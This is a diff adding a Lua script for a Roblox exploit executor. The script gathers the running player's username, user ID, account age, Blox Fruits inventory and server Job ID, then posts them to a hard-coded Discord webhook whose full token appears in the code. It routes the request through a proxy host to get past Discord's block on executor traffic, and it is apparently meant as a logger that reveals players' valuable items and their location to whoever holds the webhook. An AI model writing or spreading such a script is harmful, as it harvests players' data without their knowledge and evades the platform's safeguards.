@@ -1,0 +1,105 @@
+local webhookUrl = "https://discordapp.com/api/webhooks/1550879483597430815/fMQ3zoYgEFQMbvQLxsnn_pFyK_0_Nq6lmbqqBEITgNOKz5mlpaEU5c5HEwtiLDv6lzV-"
+
+-- Proxy Discord URL to bypass Discord's executor/Roblox IP block
+local proxyUrl = webhookUrl:gsub("discord.com", "hooks.hyra.io"):gsub("discordapp.com", "hooks.hyra.io")
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+-- 1. Account Join Date
+local accountAgeInDays = player.AccountAge or 0
+local joinTimestamp = os.time() - (accountAgeInDays * 86400)
+local joinDate = os.date("%Y-%m-%d", joinTimestamp)
+
+-- 2. Fetch Stored Fruits Safely
+local storedFruitsList = {}
+local fruitCounts = {}
+
+-- Safely query getInventory without crashing the script
+local success, result = pcall(function()
+    return ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventory")
+end)
+
+if success and type(result) == "table" then
+    for _, item in pairs(result) do
+        if type(item) == "table" then
+            local rawName = item.Name or item.name or ""
+            local itemType = item.Type or item.type or ""
+            
+            if itemType == "Blox Fruit" or rawName:find("Fruit") or rawName:find("-") then
+                local cleanName = rawName:match("^(.-)%-") or rawName
+                cleanName = cleanName:gsub(" Fruit", "")
+                fruitCounts[cleanName] = (fruitCounts[cleanName] or 0) + 1
+            end
+        end
+    end
+    
+    for fruitName, count in pairs(fruitCounts) do
+        table.insert(storedFruitsList, "• " .. fruitName .. " (x" .. tostring(count) .. ")")
+    end
+end
+
+-- Fallback UI Scraping if remote call returned empty
+if #storedFruitsList == 0 then
+    pcall(function()
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if playerGui and playerGui:FindFirstChild("Main") then
+            for _, v in ipairs(playerGui.Main:GetDescendants()) do
+                if v:IsA("TextLabel") and v.Text and v.Text:find("Fruit") then
+                    table.insert(storedFruitsList, "• " .. v.Text)
+                end
+            end
+        end
+    end)
+end
+
+local storedDataString = #storedFruitsList > 0 and table.concat(storedFruitsList, "\n") or "No stored fruits found (Open Treasure tab in-game first)"
+
+if #storedDataString > 1000 then
+    storedDataString = string.sub(storedDataString, 1, 950) .. "\n...and more"
+end
+
+-- 3. Construct Payload
+local payload = {
+    ["username"] = "Client Webhook Test",
+    ["embeds"] = {{
+        ["title"] = "Player Info & Stored Fruits",
+        ["color"] = 65280, -- Green
+        ["fields"] = {
+            { ["name"] = "Username", ["value"] = player.Name or "Unknown", ["inline"] = true },
+            { ["name"] = "User ID", ["value"] = tostring(player.UserId or 0), ["inline"] = true },
+            { ["name"] = "Account Join Date", ["value"] = joinDate .. " (" .. tostring(accountAgeInDays) .. " days old)", ["inline"] = false },
+            { ["name"] = "Stored Fruits (Treasure)", ["value"] = storedDataString, ["inline"] = false },
+            { ["name"] = "Server Job ID", ["value"] = game.JobId ~= "" and game.JobId or "Main Server", ["inline"] = false }
+        }
+    }}
+}
+
+-- 4. Send Request
+local jsonPayload = HttpService:JSONEncode(payload)
+local httpRequest = (syn and syn.request) or (http and http.request) or request or http_request
+
+if httpRequest then
+    -- Try proxy URL first to prevent Discord IP ban block
+    local response = httpRequest({
+        Url = proxyUrl,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = jsonPayload
+    })
+    
+    -- Fallback to direct URL if proxy is unavailable
+    if not response or (response.StatusCode and response.StatusCode >= 400) then
+        httpRequest({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = jsonPayload
+        })
+    end
+    print("Webhook process completed.")
+else
+    warn("Your executor does not support custom HTTP requests.")
+end
